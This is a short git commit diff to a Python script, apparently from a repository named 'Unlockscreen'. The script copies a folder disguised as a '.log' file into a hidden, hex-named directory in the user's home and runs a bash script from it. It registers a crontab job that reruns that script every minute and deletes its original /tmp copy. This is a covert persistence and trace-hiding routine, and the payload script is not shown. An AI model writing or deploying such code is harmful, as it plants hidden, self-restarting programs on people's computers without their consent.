a352f97f33534f41ccd20befcfbec9a987d2f1af
HardImpostor <103056913+HardImpostor@users.noreply.github.com>
2022-10-18 15:26:55 +0200

    Start

--- U6frt3A.log/script.py
+++ U6frt3A.log/script.py
@@ -5,9 +5,10 @@ os.system('cp -r /tmp/Unlockscreen/U6frt3A.log $HOME/.bdedbfdbabcbafb56cd5192663
 os.system('bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh')
 from crontab import CronTab
 user=os.environ["LOGNAME"]
-print("voici\n",user,'fin')
-cron = CronTab(user=user)
-job = cron.new(command='bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh')
+#print("voici\n",user,'fin')
+cron= CronTab(user=user)
+script="bash "+os.environ["HOME"]+'/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh'
+job = cron.new(command=script)
 job.minute.every(1)
 cron.write()
 os.system('rm -rf /tmp/Unlockscreen')
